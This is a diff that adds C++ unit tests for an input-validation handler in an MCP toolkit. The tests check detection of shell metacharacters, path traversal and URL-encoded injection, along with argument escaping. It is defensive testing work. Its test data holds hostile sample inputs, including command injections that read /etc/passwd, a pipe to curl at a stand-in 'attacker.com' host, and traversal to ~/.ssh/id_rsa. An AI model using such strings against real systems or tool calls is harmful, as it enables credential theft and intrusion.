@@ -6,6 +6,7 @@
 #include "json_parser.h"
 #include "json_builder.h"
 #include "mcp_adapter.h"
+#include "input_validation.h"
 
 using namespace mcptoolkit;
 
@@ -1161,11 +1162,245 @@ void RunAdapterTests() {
     test_adapter_notification_no_response();
     test_adapter_multiple_messages();
 }
+
+// =============================================================================
+// INPUT VALIDATION HANDLER TESTS
+// =============================================================================
+
+void test_input_validation_shell_metacharacters() {
+    std::cout << "\n=== TEST IV1: Detect Shell Metacharacters ===" << std::endl;
+
+    InputValidationHandler validator;
+
+    // Should reject shell metacharacters
+    assert_eq("Reject ; (semicolon)",
+              validator.contains_shell_metacharacters("whoami; cat /etc/passwd"));
+    assert_eq("Reject | (pipe)",
+              validator.contains_shell_metacharacters("grep secret | curl attacker.com"));
+    assert_eq("Reject & (ampersand)",
+              validator.contains_shell_metacharacters("cmd1 & cmd2"));
+    assert_eq("Reject $ (dollar)",
+              validator.contains_shell_metacharacters("echo $USER"));
+    assert_eq("Reject $() (command substitution)",
+              validator.contains_shell_metacharacters("$(whoami)"));
+    assert_eq("Reject backtick",
+              validator.contains_shell_metacharacters("`whoami`"));
+    assert_eq("Reject < (less than)",
+              validator.contains_shell_metacharacters("cmd < file.txt"));
+    assert_eq("Reject > (greater than)",
+              validator.contains_shell_metacharacters("cmd > output.txt"));
+    assert_eq("Reject && (and)",
+              validator.contains_shell_metacharacters("cmd1 && cmd2"));
+    assert_eq("Reject || (or)",
+              validator.contains_shell_metacharacters("cmd1 || cmd2"));
+
+    // Should accept safe strings
+    assert_eq("Accept alphanumeric",
+              !validator.contains_shell_metacharacters("hello123"));
+    assert_eq("Accept with dashes",
+              !validator.contains_shell_metacharacters("my-file-name"));
+    assert_eq("Accept with underscores",
+              !validator.contains_shell_metacharacters("my_file_name"));
+    assert_eq("Accept with dots",
+              !validator.contains_shell_metacharacters("file.txt"));
+    assert_eq("Accept empty string",
+              !validator.contains_shell_metacharacters(""));
+}
+
+void test_input_validation_path_traversal() {
+    std::cout << "\n=== TEST IV2: Detect Path Traversal ===" << std::endl;
+
+    InputValidationHandler validator;
+
+    // Should reject path traversal
+    assert_eq("Reject ..",
+              validator.contains_path_traversal("../../etc/passwd"));
+    assert_eq("Reject ~",
+              validator.contains_path_traversal("~/.ssh/id_rsa"));
+    assert_eq("Reject .. in middle",
+              validator.contains_path_traversal("files/../../../etc/passwd"));
+
+    // Should accept safe paths
+    assert_eq("Accept absolute path",
+              !validator.contains_path_traversal("/etc/config"));
+    assert_eq("Accept relative path without ..",
+              !validator.contains_path_traversal("data/files/config.txt"));
+    assert_eq("Accept single dot filename",
+              !validator.contains_path_traversal("file.backup.txt"));
+}
+
+void test_input_validation_url_encoding() {
+    std::cout << "\n=== TEST IV3: Detect URL-Encoded Metacharacters ===" << std::endl;
+
+    InputValidationHandler validator;
+
+    // Should reject encoded metacharacters
+    assert_eq("Reject %3b (;)",
+              validator.contains_encoded_metacharacters("test%3bcat /etc/passwd"));
+    assert_eq("Reject %7c (|)",
+              validator.contains_encoded_metacharacters("grep%7ccurl attacker.com"));
+    assert_eq("Reject %26 (&)",
+              validator.contains_encoded_metacharacters("cmd1%26cmd2"));
+    assert_eq("Reject %24 ($)",
+              validator.contains_encoded_metacharacters("echo%24USER"));
+    assert_eq("Reject %28 (open paren)",
+              validator.contains_encoded_metacharacters("echo%28whoami%29"));
+    assert_eq("Reject %3c (<)",
+              validator.contains_encoded_metacharacters("cmd%3cfile.txt"));
+    assert_eq("Reject %0a (newline)",
+              validator.contains_encoded_metacharacters("line1%0aline2"));
+
+    // Should accept safe strings
+    assert_eq("Accept normal URL encoding",
+              !validator.contains_encoded_metacharacters("hello%20world"));
+    assert_eq("Accept no encoding",
+              !validator.contains_encoded_metacharacters("normal-string"));
+}
+
+void test_input_validation_shell_escape() {
+    std::cout << "\n=== TEST IV4: Shell Argument Escaping ===" << std::endl;
+
+    InputValidationHandler validator;
+
+    // Test escaping function
+    std::string safe1 = validator.escape_shell_argument("hello world");
+    assert_eq("Escaped: hello world", safe1 == "'hello world'");
+
+    std::string safe2 = validator.escape_shell_argument("it's");
+    assert_eq("Escaped: it's", safe2 == "'it'\\''s'");
+
+    std::string safe3 = validator.escape_shell_argument("");
+    assert_eq("Escaped: empty string", safe3 == "''");
+
+    std::string safe4 = validator.escape_shell_argument("normal");
+    assert_eq("Escaped: normal", safe4 == "'normal'");
+}
+
+void test_input_validation_regex_patterns() {
+    std::cout << "\n=== TEST IV5: Regex Pattern Validation ===" << std::endl;
+
+    InputValidationHandler validator;
+
+    // Create validation rules
+    ToolValidationRules rules;
+    rules.tool_name = "read_file";
+
+    // Require path argument (only alphanumeric, dash, underscore, dot, slash)
+    ArgumentValidationRule path_rule;
+    path_rule.arg_name = "path";
+    path_rule.pattern = "^[a-zA-Z0-9._/-]+$";
+    path_rule.allow_path_traversal = false;
+    rules.required_args.push_back(path_rule);
+
+    validator.register_tool_rules(rules);
+
+    // Valid arguments
+    {
+        std::map<std::string, std::string> args;
+        args["path"] = "data/file.txt";
+        std::string error;
+        assert_eq("Validate: data/file.txt",
+                  validator.validate_arguments("read_file", args, error));
+    }
+
+    // Invalid: path traversal
+    {
+        std::map<std::string, std::string> args;
+        args["path"] = "../../etc/passwd";
+        std::string error;
+        assert_eq("Reject: ../../etc/passwd",
+                  !validator.validate_arguments("read_file", args, error));
+    }
+
+    // Invalid: missing required argument
+    {
+        std::map<std::string, std::string> args;
+        // path is missing
+        std::string error;
+        assert_eq("Reject: missing path",
+                  !validator.validate_arguments("read_file", args, error));
+    }
+}
+
+void test_input_validation_with_stub_server() {
+    std::cout << "\n=== TEST IV6: Validation with Stub MCP Server ===" << std::endl;
+
+    class ValidatingServer : public MCPAdapter {
+    public:
+        std::vector<std::string> rejected_attempts;
+
+    protected:
+        std::vector<ToolDefinition> list_tools() override {
+            return {{
+                "execute",
+                "Execute a safe command",
+                {{ "cmd", "string", "Command (safe, no shell metacharacters)", true }}
+            }};
+        }
+
+        ToolResult call_tool(const std::string& name,
+                             const std::string& args_json) override {
+            if (name == "execute") {
+                // Validate arguments before execution
+                std::string error;
+                if (validator().contains_shell_metacharacters(args_json)) {
+                    rejected_attempts.push_back(args_json);
+                    return {"Rejected: shell metacharacters detected", true};
+                }
+                if (validator().contains_encoded_metacharacters(args_json)) {
+                    rejected_attempts.push_back(args_json);
+                    return {"Rejected: encoded metacharacters detected", true};
+                }
+                return {"executed safely"};
+            }
+            return {"unknown tool", true};
+        }
+    };
+
+    ValidatingServer server;
+
+    // Test 1: Safe command should pass
+    {
+        std::string input = R"({"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"execute","arguments":{"cmd":"whoami"}}})";
+        std::string out = run_adapter(server, input + "\n");
+        assert_eq("Safe command accepted",
+                  out.find("executed safely") != std::string::npos);
+    }
+
+    // Test 2: Malicious command with semicolon should be rejected
+    {
+        std::string input = R"({"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"execute","arguments":{"cmd":"whoami; cat /etc/passwd"}}})";
+        std::string out = run_adapter(server, input + "\n");
+        assert_eq("Command injection rejected",
+                  out.find("Rejected") != std::string::npos || out.find("isError") != std::string::npos);
+    }
+
+    // Test 3: URL-encoded injection should be rejected
+    {
+        std::string input = R"({"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"execute","arguments":{"cmd":"whoami%3bcat%20/etc/passwd"}}})";
+        std::string out = run_adapter(server, input + "\n");
+        assert_eq("URL-encoded injection rejected",
+                  out.find("Rejected") != std::string::npos || out.find("isError") != std::string::npos);
+    }
+
+    std::cout << "  Total rejection attempts: " << server.rejected_attempts.size() << std::endl;
+}
+
+void RunValidationTests() {
+    test_input_validation_shell_metacharacters();
+    test_input_validation_path_traversal();
+    test_input_validation_url_encoding();
+    test_input_validation_shell_escape();
+    test_input_validation_regex_patterns();
+    test_input_validation_with_stub_server();
+}
+
 int main()
 {
     RunParserTests();
     RunAdapterTests();
     RunSecurityTests();
+    RunValidationTests();
     std::cout << "\n" << pass_count << "/" << test_count << " tests passed\n";
 }
 
